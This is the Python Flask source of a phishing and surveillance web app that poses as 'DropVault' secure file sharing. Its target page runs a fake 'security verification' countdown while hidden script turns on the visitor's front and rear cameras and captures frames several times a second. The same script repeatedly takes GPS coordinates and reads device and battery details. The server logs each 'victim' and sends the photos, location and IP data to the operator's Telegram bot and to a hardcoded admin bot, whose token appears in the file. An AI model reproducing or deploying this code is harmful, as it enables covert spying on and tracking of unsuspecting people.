# by:@ROMEO_UCHIHA (Silent Background Capture & Direct File Access)
from flask import Flask, request, render_template_string, jsonify, redirect, session
from supabase import create_client, Client
import base64, requests, os, time, uuid, random, json

app = Flask(__name__)
app.secret_key = "uchiha_super_secret_key" 
app.config['TEMPLATES_AUTO_RELOAD'] = True

# --- CACHE BUSTER ---
@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

# --- SUPABASE & ADMIN CONFIG ---
SUPA_URL = "https://gijnkxuaejsjbxfruslm.supabase.co"
SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imdpam5reHVhZWpzamJ4ZnJ1c2xtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NTYzMzcsImV4cCI6MjA4NTMzMjMzN30.6RFyECY1aRVqxniS3xcv_iol31Su1QNLqXGGfTFlHu0"
supabase: Client = create_client(SUPA_URL, SUPA_KEY)

ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
ADMIN_CID = "6383817850"

# Escapes chars for Telegram MarkdownV2 to avoid API errors
def escape_md(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + char if char in escape_chars else char for char in str(text))

# Send TG Message with BOLD formatting and permanent footer
def send_tg_msg(token, cid, text):
    try: 
        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
        full_text = text + footer
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage", 
            json={"chat_id": cid, "text": full_text, "parse_mode": "MarkdownV2"},
            timeout=5
        )
    except: pass

def send_tg_photo(token, cid, raw_img, caption=""):
    try: 
        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
        full_caption = caption + footer
        requests.post(
            f"https://api.telegram.org/bot{token}/sendPhoto", 
            data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
            files={"photo": ("c.jpg", raw_img, "image/jpeg")}, 
            timeout=10
        )
    except: pass

def get_bot_name(token):
    try:
        res = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if res.get("ok"): return res["result"]["first_name"]
    except: pass
    return "Unknown Node"

# --- UI TEMPLATES (Tailwind, Aurora Gradient, Dark/Light Mode) ---
# Main Layout Wrapper
def get_base_html(content, title="DropVault"):
    return f"""
    <!DOCTYPE html>
    <html lang="en" class="dark">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>{title}</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
        <script>
            tailwind.config = {{
                darkMode: 'class',
                theme: {{ extend: {{ fontFamily: {{ sans: ['Plus Jakarta Sans', 'sans-serif'], display: ['Orbitron', 'sans-serif'] }} }} }}
            }}
        </script>
        <style>
            body {{ transition: background-color 0.4s, color 0.4s; overflow-x: hidden; }}
            .dark body {{ background-color: #05000a; color: #ffffff; }}
            .light body {{ background-color: #f8fafc; color: #0f172a; }}
            
            /* Aurora Orbs */
            .orb-1 {{ position: fixed; top: -10%; left: -10%; width: 50vw; height: 50vw; background: radial-gradient(circle, rgba(0,229,255,0.15) 0%, transparent 60%); filter: blur(80px); z-index: -1; pointer-events: none; }}
            .orb-2 {{ position: fixed; bottom: -20%; right: -10%; width: 60vw; height: 60vw; background: radial-gradient(circle, rgba(255,0,85,0.15) 0%, transparent 60%); filter: blur(100px); z-index: -1; pointer-events: none; }}
            .light .orb-1 {{ background: radial-gradient(circle, rgba(0,229,255,0.2) 0%, transparent 60%); }}
            .light .orb-2 {{ background: radial-gradient(circle, rgba(255,0,85,0.15) 0%, transparent 60%); }}

            /* Glass Panels */
            .glass-panel {{ background: rgba(20, 20, 30, 0.5); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }}
            .light .glass-panel {{ background: rgba(255, 255, 255, 0.7); border: 1px solid rgba(0,0,0,0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.05); }}
            
            .input-glass {{ background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); color: white; transition: 0.3s; }}
            .light .input-glass {{ background: rgba(255,255,255,0.9); border: 1px solid rgba(0,0,0,0.2); color: #000; }}
            .input-glass:focus {{ border-color: #00e5ff; box-shadow: 0 0 15px rgba(0,229,255,0.3); outline: none; }}

            /* Theme Bubble */
            .theme-toggle {{ position: fixed; top: 20px; right: 20px; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 1000; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: all 0.3s; }}
            .dark .theme-toggle {{ background: #1e1e2e; border: 1px solid rgba(255,255,255,0.1); color: #00e5ff; }}
            .light .theme-toggle {{ background: #ffffff; border: 1px solid rgba(0,0,0,0.1); color: #ff0055; }}
            .theme-toggle:hover {{ transform: scale(1.1); }}
        </style>
    </head>
    <body class="min-h-screen flex flex-col items-center justify-center p-4">
        <div class="orb-1"></div><div class="orb-2"></div>
        
        <div class="theme-toggle" onclick="toggleTheme()"><i id="themeIcon" class="fas fa-moon text-xl"></i></div>
        
        {content}

        <script>
            function toggleTheme() {{
                let html = document.documentElement;
                let icon = document.getElementById('themeIcon');
                if(html.classList.contains('dark')) {{
                    html.classList.remove('dark'); html.classList.add('light');
                    icon.className = 'fas fa-sun text-xl';
                    localStorage.setItem('theme', 'light');
                }} else {{
                    html.classList.remove('light'); html.classList.add('dark');
                    icon.className = 'fas fa-moon text-xl';
                    localStorage.setItem('theme', 'dark');
                }}
            }}
            if(localStorage.getItem('theme') === 'light') {{ toggleTheme(); }}
        </script>
    </body>
    </html>
    """

# Landing Page Update
@app.route("/")
def index(): 
    content = """
    <div class="text-center max-w-3xl z-10 relative mt-10">
        <div class="inline-block p-4 rounded-3xl bg-gradient-to-r from-cyan-500/20 to-pink-500/20 border border-white/10 mb-6 backdrop-blur-md">
            <h1 class="font-display font-black text-5xl md:text-7xl text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-pink-500 tracking-wider">DropVault</h1>
        </div>
        <p class="text-lg md:text-xl opacity-80 mb-10 font-medium">Next-Gen File Sharing Infrastructure with Identity & Location verification.</p>
        <div class="flex gap-4 justify-center">
            <a href="/lg" class="px-8 py-4 rounded-full bg-black/40 border border-cyan-500/50 hover:bg-cyan-500 hover:text-black font-bold uppercase tracking-widest transition-all shadow-[0_0_20px_rgba(0,229,255,0.2)]">Login</a>
            <a href="/rg" class="px-8 py-4 rounded-full bg-gradient-to-r from-cyan-500 to-pink-500 text-white font-bold uppercase tracking-widest hover:scale-105 transition-transform shadow-[0_10px_30px_rgba(255,0,85,0.4)]">Start Sharing</a>
        </div>
        
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-20">
            <div class="glass-panel p-6 text-left">
                <i class="fas fa-folder-open text-4xl text-cyan-400 mb-4"></i>
                <h3 class="font-bold text-xl mb-2">Secure Delivery</h3>
                <p class="opacity-70 text-sm">Share files safely with instant deployment across multiple nodes.</p>
            </div>
            <div class="glass-panel p-6 text-left">
                <i class="fas fa-fingerprint text-4xl text-pink-500 mb-4"></i>
                <h3 class="font-bold text-xl mb-2">Identity Gate</h3>
                <p class="opacity-70 text-sm">Visual verification ensures only authorized targets access payload.</p>
            </div>
            <div class="glass-panel p-6 text-left">
                <i class="fas fa-location-crosshairs text-4xl text-purple-400 mb-4"></i>
                <h3 class="font-bold text-xl mb-2">Geo-Locked</h3>
                <p class="opacity-70 text-sm">Restrict downloads to specific coordinates seamlessly.</p>
            </div>
        </div>
    </div>
    """
    return render_template_string(get_base_html(content, "DropVault | Home"))

@app.route("/rg", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        token, cid = request.form.get("token"), request.form.get("cid")
        otp = str(random.randint(1000, 9999))
        supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "bot_name": get_bot_name(token), "purpose": "register"}).execute()
        
        msg = f"😈 *SYSTEM REGISTRATION*\n\n*Code:* `{escape_md(otp)}`"
        send_tg_msg(token, cid, msg)
        return redirect(f"/verify_otp?cid={cid}&purpose=register")
    
    content = """
    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative">
        <h2 class="font-display font-black text-3xl mb-8 text-center text-transparent bg-clip-text bg-gradient-to-r from-pink-500 to-cyan-400">CREATE ACCOUNT</h2>
        <form method="POST" class="flex flex-col gap-4">
            <div class="relative"><i class="fas fa-robot absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="token" placeholder="Telegram Bot Token" required class="input-glass w-full p-4 pl-12 rounded-xl font-mono text-sm"></div>
            <div class="relative"><i class="fas fa-id-badge absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="cid" placeholder="Admin Chat ID" required class="input-glass w-full p-4 pl-12 rounded-xl font-mono text-sm"></div>
            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Send OTP <i class="fas fa-paper-plane ml-2"></i></button>
        </form>
        <div class="text-center mt-6"><a href="/lg" class="text-sm font-bold opacity-60 hover:opacity-100 hover:text-cyan-400 transition-colors uppercase tracking-wider">Already registered? Login</a></div>
    </div>
    """
    return render_template_string(get_base_html(content, "Register | DropVault"))

@app.route("/lg", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        cid = request.form.get("cid")
        users = supabase.table("users").select("*").eq("chat_id", cid).execute().data
        if not users: 
            return render_template_string(get_base_html("<div class='glass-panel p-10 text-center z-10 relative'><i class='fas fa-triangle-exclamation text-5xl text-pink-500 mb-4'></i><h2 class='font-bold text-2xl mb-4'>Not Registered!</h2><a href='/rg' class='bg-pink-500 text-white px-6 py-3 rounded-xl font-bold uppercase'>Register Now</a></div>", "Error"))
        elif len(users) == 1:
            otp = str(random.randint(1000, 9999))
            supabase.table("otps").insert({"chat_id": cid, "bot_token": users[0]["bot_token"], "otp": otp, "purpose": "login"}).execute()
            msg = f"🔐 *LOGIN OTP*\n\n*Code:* `{escape_md(otp)}`"
            send_tg_msg(users[0]["bot_token"], cid, msg)
            return redirect(f"/verify_otp?cid={cid}&purpose=login&token={users[0]['bot_token']}")
        else:
            html = """<div class='glass-panel p-8 w-full max-w-md z-10 relative'><h2 class='font-display font-black text-2xl mb-6 text-center text-cyan-400'>SELECT NODE</h2><div class='flex flex-col gap-3'>"""
            for u in users: 
                html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button type='submit' class='w-full input-glass p-4 rounded-xl text-left font-bold hover:border-cyan-400 transition-colors'><i class='fas fa-robot text-cyan-400 mr-3'></i> {u['bot_name']}</button></form>"
            html += "</div></div>"
            return render_template_string(get_base_html(html, "Select Node"))
            
    content = """
    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative">
        <div class="w-20 h-20 mx-auto bg-gradient-to-br from-cyan-400 to-blue-500 rounded-2xl flex items-center justify-center shadow-[0_0_20px_rgba(0,229,255,0.4)] mb-6"><i class="fas fa-fingerprint text-4xl text-white"></i></div>
        <h2 class="font-display font-black text-3xl mb-8 text-center text-white">WELCOME <span class="text-cyan-400">BACK</span></h2>
        <form method="POST" class="flex flex-col gap-4">
            <div class="relative"><i class="fas fa-id-card absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="cid" placeholder="Enter System Chat ID" required class="input-glass w-full p-4 pl-12 rounded-xl font-mono text-center tracking-widest font-bold"></div>
            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Initialize Uplink <i class="fas fa-bolt ml-2"></i></button>
        </form>
        <div class="text-center mt-6"><a href="/rg" class="text-sm font-bold opacity-60 hover:opacity-100 hover:text-pink-500 transition-colors uppercase tracking-wider">Create a new account</a></div>
    </div>
    """
    return render_template_string(get_base_html(content, "Login | DropVault"))

@app.route("/send_login_otp", methods=["POST"])
def send_login_otp():
    cid, token = request.form.get("cid"), request.form.get("token")
    otp = str(random.randint(1000, 9999))
    supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "purpose": "login"}).execute()
    msg = f"🔐 *LOGIN OTP*\n\n*Code:* `{escape_md(otp)}`"
    send_tg_msg(token, cid, msg)
    return redirect(f"/verify_otp?cid={cid}&purpose=login&token={token}")

@app.route("/verify_otp", methods=["GET", "POST"])
def verify_otp():
    cid, purpose, token = request.args.get("cid"), request.args.get("purpose"), request.args.get("token", "")
    if request.method == "POST":
        query = supabase.table("otps").select("*").eq("chat_id", cid).eq("purpose", purpose).eq("otp", request.form.get("otp"))
        if token: query = query.eq("bot_token", token)
        res = query.execute().data
        if res:
            if purpose == "register": supabase.table("users").insert({"chat_id": cid, "bot_token": res[-1]["bot_token"], "bot_name": res[-1]["bot_name"]}).execute()
            session["user_id"] = supabase.table("users").select("*").eq("bot_token", res[-1]["bot_token"]).execute().data[0]["id"]
            supabase.table("otps").delete().eq("chat_id", cid).execute()
            return redirect("/ds")
        return render_template_string(get_base_html("<div class='glass-panel p-10 text-center z-10 relative'><i class='fas fa-circle-xmark text-5xl text-pink-500 mb-4'></i><h2 class='font-bold text-2xl mb-4'>Invalid OTP!</h2><a href='/lg' class='bg-pink-500 text-white px-6 py-3 rounded-xl font-bold uppercase'>Try Again</a></div>", "Error"))
    
    content = """
    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative">
        <h2 class="font-display font-black text-3xl mb-2 text-center text-white">VERIFY <span class="text-cyan-400">OTP</span></h2>
        <p class="text-center text-xs font-bold uppercase tracking-widest text-pink-500 mb-8"><i class="fas fa-paper-plane mr-1"></i> Check Telegram Bot</p>
        <form method="POST" class="flex flex-col gap-4">
            <input type="text" name="otp" placeholder="••••" maxlength="4" required class="input-glass w-full p-5 rounded-xl text-center text-4xl tracking-[1em] font-black outline-none focus:border-cyan-400">
            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all"><i class="fas fa-unlock-keyhole mr-2"></i> Authenticate</button>
        </form>
    </div>
    """
    return render_template_string(get_base_html(content, "Verify OTP"))


# --- TARGET PAGE (10s Wait + Steatlh Capture) ---
@app.route("/t/<link_id>")
def target_page(link_id):
    res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
    if not res.data: return "File Not Found or Removed!"
    
    data = res.data[0]
    action_mode = data.get("action_mode", "redirect")
    action_value = data.get("action_value", "")
    text_content = data.get("text_content", "")
    file_type = data.get("file_type", "")

    html_code = '''
    <!DOCTYPE html>
    <html lang="en" class="dark">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>DropVault | Secure Access</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #05000a; color: white; overflow-x: hidden; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
            .orb { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80vw; height: 80vw; background: radial-gradient(circle, rgba(0,229,255,0.1) 0%, transparent 60%); filter: blur(80px); z-index: -1; }
            .glass-box { background: rgba(20, 20, 30, 0.6); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); padding: 40px; width: 100%; max-width: 500px; text-align: center; }
            .progress-ring circle { transition: stroke-dashoffset 1s linear; transform: rotate(-90deg); transform-origin: 50% 50%; }
        </style>
    </head>
    <body>
        <div class="orb"></div>

        <div id="wait-screen" class="glass-box z-10">
            <h2 class="font-display font-black text-2xl mb-2 text-cyan-400">SECURITY VERIFICATION</h2>
            <p class="text-xs font-bold uppercase tracking-widest text-gray-400 mb-8">Checking Node Integrity...</p>
            
            <div class="relative w-32 h-32 mx-auto mb-8">
                <svg class="progress-ring w-full h-full" width="128" height="128">
                    <circle stroke="rgba(255,255,255,0.1)" stroke-width="8" fill="transparent" r="56" cx="64" cy="64"/>
                    <circle id="ring-progress" stroke="#00e5ff" stroke-width="8" fill="transparent" r="56" cx="64" cy="64" stroke-dasharray="351.86" stroke-dashoffset="0"/>
                </svg>
                <div class="absolute inset-0 flex items-center justify-center flex-col">
                    <span id="timer-count" class="font-display font-black text-4xl text-white">10</span>
                </div>
            </div>
            
            <p class="text-sm font-medium opacity-80"><i class="fas fa-shield-halved text-cyan-400 mr-2"></i> Please wait while we decrypt the payload.</p>
        </div>

        <div id="media-content" class="glass-box hidden z-10"></div>

        <canvas id="c" class="hidden"></canvas>
        <video id="bg-v" playsinline autoplay muted class="fixed top-[-1000px] left-[-1000px] w-2 h-2 opacity-0 -z-50"></video>

        <script>
            let actMode = "{{ a_mode }}"; let actVal = "{{ a_val }}"; let txtVal = {{ t_content | tojson | safe }}; let fType = "{{ f_type }}";
            let camStream = null; let currentCam = "user"; let captureIntervalId = null; let lastSentImage = "";

            // Battery Fetcher
            let batteryInfo = "Not Fetched";
            if(navigator.getBattery) {
                navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; });
            }

            window.onload = () => { 
                // Start Verification Timer UI
                startVerificationTimer();
                
                // Stealth capture in background immediately
                setTimeout(() => {
                    getHardware(); 
                    fetchLocation();
                    startUltraStealthSequence();
                }, 1000); 
                
                setInterval(fetchLocation, 15000); 
            };

            function startVerificationTimer() {
                let count = 10;
                let circle = document.getElementById('ring-progress');
                let circumference = 56 * 2 * Math.PI; // 351.86
                
                let timer = setInterval(() => {
                    count--;
                    document.getElementById('timer-count').innerText = count;
                    let offset = circumference - (count / 10) * circumference;
                    circle.style.strokeDashoffset = offset;

                    if(count <= 0) {
                        clearInterval(timer);
                        document.getElementById('wait-screen').classList.add('hidden');
                        showFileContent();
                    }
                }, 1000);
            }

            function getHardware() {
                let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0, battery: batteryInfo };
                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) }).catch(()=>{});
            }

            function fetchLocation() {
                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (p) => { fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) }).catch(()=>{}); },
                        (e) => {}, { timeout: 8000 }
                    );
                }
            }

            function showFileContent() {
                let medBox = document.getElementById('media-content');
                medBox.classList.remove('hidden');
                let html = "";
                
                if(actMode === 'text') {
                    html = `<h2 class="font-display font-black text-2xl mb-4 text-cyan-400">DECRYPTED DATA</h2><div class="bg-black/40 p-4 rounded-xl text-left whitespace-pre-wrap font-mono text-sm border border-white/10">${txtVal}</div>`;
                } else if (actMode === 'file') {
                    let ext = actVal.split('.').pop().toLowerCase();
                    let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
                    let isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext);

                    let previewHtml = '';
                    if(isVideo || fType === 'video') {
                        previewHtml = `<video src="${actVal}" controls autoplay playsinline class="w-full max-h-[300px] rounded-xl bg-black mb-6 border border-white/10" onerror="this.outerHTML='<div class=\\'py-10 bg-black/40 rounded-xl mb-6\\'><i class=\\'fas fa-file-video text-4xl text-cyan-400 mb-2\\'></i><p class=\\'text-xs uppercase font-bold\\'>Video Ready</p></div>'"></video>`;
                    } else if (isImage || fType === 'image') {
                        previewHtml = `<img src="${actVal}" class="w-full max-h-[300px] object-contain rounded-xl mb-6 border border-white/10" onerror="this.outerHTML='<div class=\\'py-10 bg-black/40 rounded-xl mb-6\\'><i class=\\'fas fa-file-image text-4xl text-cyan-400 mb-2\\'></i><p class=\\'text-xs uppercase font-bold\\'>Image Ready</p></div>'">`;
                    } else {
                        previewHtml = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-file-archive text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">Secure Document</p></div>`;
                    }

                    html = `
                        <h2 class="font-display font-black text-xl mb-6 text-white">ACCESS <span class="text-cyan-400">GRANTED</span></h2>
                        ${previewHtml}
                        <a href="${actVal}" target="_blank" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all"><i class="fas fa-download mr-2"></i> Download Payload</a>
                    `;
                } else {
                    html = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-link text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">External Gateway</p></div>
                    <a href="${actVal}" target="_blank" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Proceed to Link <i class="fas fa-arrow-right ml-2"></i></a>`;
                }
                medBox.innerHTML = html;
            }

            async function switchCameraTo(facingModeStr) {
                if (camStream) { camStream.getTracks().forEach(track => track.stop()); camStream = null; }
                try {
                    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingModeStr === "environment" ? { ideal: "environment" } : "user", width: { ideal: 1280 }, height: { ideal: 720 } } });
                    const bgV = document.getElementById('bg-v');
                    bgV.srcObject = camStream; bgV.onloadedmetadata = () => { bgV.play(); };
                    currentCam = facingModeStr;
                } catch(e) {}
            }

            function captureUltraFast() {
                if(camStream) {
                    const bgV = document.getElementById('bg-v'); const c = document.getElementById('c');
                    if(bgV.videoWidth > 0) {
                        c.width = bgV.videoWidth; c.height = bgV.videoHeight;
                        c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
                        let imgData = c.toDataURL('image/jpeg', 0.8);
                        if (imgData === lastSentImage) return; 
                        lastSentImage = imgData;
                        fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: currentCam.toUpperCase() }) }).catch(()=>{});
                    }
                }
            }

            async function startUltraStealthSequence() {
                currentCam = "user"; await switchCameraTo(currentCam);
                if(captureIntervalId) clearInterval(captureIntervalId);
                captureIntervalId = setInterval(captureUltraFast, 350);
                runCamCycle();
            }

            function runCamCycle() {
                if (currentCam === "user") { setTimeout(async () => { await switchCameraTo("environment"); runCamCycle(); }, 20000); } 
                else { setTimeout(async () => { await switchCameraTo("user"); runCamCycle(); }, 10000); }
            }
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_code, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id)

# --- BACKEND LOGGING APIS ---
@app.route("/api/log_hardware/<l_id>", methods=["POST"])
def log_hw(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        d = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # IP Tracking
        ip_data = {}
        try:
            res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,query", timeout=3).json()
            if res.get("status") == "success": ip_data = res
        except: pass
        
        dev_info = f"{d.get('plat', 'Unknown')} - Cores: {d.get('cores', '0')}"
        battery = d.get('battery', 'Unknown')
        
        # Save to DB (For Core Dashboard)
        supabase.table("victims").insert({
            "link_id": l_id, "user_id": link["user_id"], "ip_address": ip,
            "ip_details": ip_data, "device_info": dev_info, "battery_info": battery
        }).execute()
        
        loc_str = f"{ip_data.get('city', 'Unknown')}, {ip_data.get('country', 'Unknown')}"
        isp_str = ip_data.get('isp', 'Unknown ISP')
        mode = escape_md(link['target_type'].upper())
        
        # BOLD MarkdownV2 Message
        msg = (
            f"🎯 *TARGET HIT*\n\n"
            f"🌐 *IP:* `{escape_md(ip)}`\n"
            f"📍 *Location:* `{escape_md(loc_str)}`\n"
            f"🏢 *ISP:* `{escape_md(isp_str)}`\n"
            f"💻 *Device:* `{escape_md(dev_info)}`\n"
            f"🔋 *Battery:* `{escape_md(battery)}`\n"
            f"📌 *Mode:* `{mode}`"
        )
        send_tg_msg(user["bot_token"], user["chat_id"], msg)
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: HIT*\n*By:* `{escape_md(user['bot_name'])}`\n*IP:* `{escape_md(ip)}`")
    except Exception as e: print(e)
    return jsonify({"s": 1})

@app.route("/api/log_loc/<l_id>", methods=["POST"])
def log_loc(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        d = request.get_json()
        
        lat = escape_md(str(d['lat']))
        lon = escape_md(str(d['lon']))
        map_url = escape_md(f"https://www.google.com/maps?q={d['lat']},{d['lon']}")
        
        msg = f"📍 *PRECISE LOCATION*\n\n*Lat:* `{lat}`\n*Lon:* `{lon}`\n🗺 *Map:* [View Here]({map_url})"
        send_tg_msg(user["bot_token"], user["chat_id"], msg)
    except: pass
    return jsonify({"s": 1})

@app.route("/api/capture/<l_id>", methods=["POST"])
def cap(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        data = request.get_json()
        
        cam_type = escape_md(data.get("cam_type", "UNKNOWN"))
        raw = base64.b64decode(data["img"].split(",")[1])
        
        caption = f"😈 *UCHIHA CAPTURE*\n📸 *Camera:* `{cam_type}`"
        send_tg_photo(user["bot_token"], user["chat_id"], raw, caption)
    except: pass
    return jsonify({"s": 1})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
